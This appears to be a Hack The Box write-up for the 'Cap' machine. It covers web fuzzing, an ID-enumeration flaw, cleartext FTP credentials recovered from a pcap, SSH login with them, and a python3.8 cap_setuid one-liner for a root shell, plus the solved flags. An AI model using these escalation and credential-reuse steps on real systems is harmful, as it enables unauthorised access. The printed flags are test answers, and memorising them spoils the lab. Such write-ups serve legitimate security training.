# HTB - Cap

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.13.49

---

## Reconnaissance

Nmap scan to identify exposed services :
```bash
nmap 10.129.13.49
```

![nmap](/assets/images/cap/2026-03-24-211926.png)

Three services found : FTP, SSH and a web server.

---

## Web Enumeration

Directory fuzzing with ffuf :
```bash
ffuf -w /opt/seclists/Discovery/Web-Content/common.txt -u http://10.129.13.49/FUZZ
```

![ffuf](/assets/images/cap/2026-03-24-212621.png)

Two interesting endpoints : `/data` and `/netstat`. Browsing to `/data` we notice the URL contains a numeric ID. We fuzz values from 0 to 100 to find other captures :
```bash
ffuf -u http://10.129.13.49/data/FUZZ -w <(seq 0 100) | grep 200
```

![ffuf data](/assets/images/cap/2026-03-24-213125.png)

IDs **0, 1 and 2** return a 200 status. `/data/0` contains a `.pcap` file.

---

## PCAP Analysis

We download `0.pcap` and open it in Wireshark.

Following the TCP stream of the FTP traffic (**right click → Follow → TCP Stream**) reveals credentials in cleartext :

![wireshark stream](/assets/images/cap/2026-03-24-212934.png)
```
USER nathan
PASS Buck3tH4TF0RM3!
```

![wireshark pcap](/assets/images/cap/2026-03-24-213253.png)

---

## Initial Access

We connect via SSH using the recovered credentials :
```bash
ssh nathan@10.129.13.49
```

![ssh login](/assets/images/cap/2026-03-24-213435.png)

Successfully logged in. We grab the user flag :
```bash
cat user.txt
64baf0c70225bc1910dad1e1ccb3ff94
```

---

## Privilege Escalation

We enumerate capabilities on the system :
```bash
getcap -r / 2>/dev/null
```

![getcap](/assets/images/cap/2026-03-24-213912.png)

Interesting result :
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` has `cap_setuid`, which allows changing the UID arbitrarily.
We exploit it directly :
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell obtained. We grab the root flag :
```bash
cat /root/root.txt
b5081b01360d08b892d3bdbb1ad432a2
```
